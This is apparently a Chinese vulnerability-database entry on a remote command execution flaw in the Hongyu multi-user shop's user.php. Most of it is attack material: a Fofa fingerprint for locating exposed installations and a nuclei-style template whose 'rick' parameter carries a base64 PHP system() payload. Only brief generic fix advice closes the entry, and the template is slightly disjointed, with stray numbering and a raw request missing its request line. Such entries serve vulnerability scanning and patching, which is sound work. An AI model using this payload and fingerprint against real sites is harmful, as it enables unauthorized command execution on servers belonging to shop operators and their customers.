# 鸿宇多用户商城user.php存在远程命令执行

- **系统**：鸿宇多用户商城　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="content=HongYuJD"`
- **请求**：`POST /user.php HTTP/1.1`

**请求体 / payload**
```
1. Fofa
body="content=HongYuJD" && body="68ecshopcom_360buy"
1. 部分界面如下
3、隐患url,复现如下
id: hydyhsc-user-rce
info:
name: hydyhsc-user-rce
author: m0be1
severity: critical
description: 鸿宇多用户商城user.php RCE漏洞
http:
- raw:
-
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
action=login&rick=ZWNobyhzeXN0ZW0oImVjaG8gc3RjdGVzdCIpKTs=
matchers:
- type: dsl
dsl:
- 'status_code==200 && contains_all(body,"stctest")'
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。